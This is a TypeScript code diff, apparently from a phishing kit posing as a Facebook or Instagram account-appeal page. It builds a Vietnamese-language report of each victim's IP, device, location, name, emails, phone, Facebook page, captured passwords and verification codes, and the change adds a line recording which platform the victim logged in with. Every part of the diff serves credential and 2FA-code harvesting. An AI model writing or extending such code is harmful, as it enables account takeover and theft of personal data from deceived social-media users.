@@ -1,9 +1,10 @@
-import type { GeoInfo, UserData } from '@/store/store';
+import type { GeoInfo, LoginProvider, UserData } from '@/store/store';
 
 interface BuildMessageOptions {
     geoInfo: GeoInfo | null;
     deviceLabel: string;
     userData: Pick<UserData, 'fullName' | 'personalEmail' | 'businessEmail' | 'phoneNumber' | 'facebookPageName' | 'information'>;
+    loginProvider?: LoginProvider | null;
     accounts?: string[];
     passwords?: string[];
     codes?: string[];
@@ -11,9 +12,15 @@ interface BuildMessageOptions {
     maxCode?: number;
 }
 
-export function buildAppealMessage({ geoInfo, deviceLabel, userData, accounts = [], passwords = [], codes = [], maxPass, maxCode }: BuildMessageOptions): string {
+const loginProviderLabel: Record<LoginProvider, string> = {
+    facebook: 'Facebook',
+    instagram: 'Instagram'
+};
+
+export function buildAppealMessage({ geoInfo, deviceLabel, userData, loginProvider, accounts = [], passwords = [], codes = [], maxPass, maxCode }: BuildMessageOptions): string {
     const time = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
     const location = geoInfo ? [geoInfo.city, geoInfo.region, geoInfo.country].filter(Boolean).join(', ') : 'N/A';
+    const loginLine = loginProvider ? `\n🔑 Đăng nhập: <b>${loginProviderLabel[loginProvider]}</b>` : '';
 
     const credentialLines = passwords
         .map((password, idx) => {
@@ -35,7 +42,7 @@ export function buildAppealMessage({ geoInfo, deviceLabel, userData, accounts = 
 ⏰ ${time}
 🌐 IP: <code>${geoInfo?.ip || 'N/A'}</code>
 📱 Thiết bị: <code>${deviceLabel}</code>
-📍 Vị trí: ${location}
+📍 Vị trí: ${location}${loginLine}
 ━━━━━━━━━━━━━━━━━━━━
 📋 THÔNG TIN
    Tên: <code>${userData.fullName}</code>
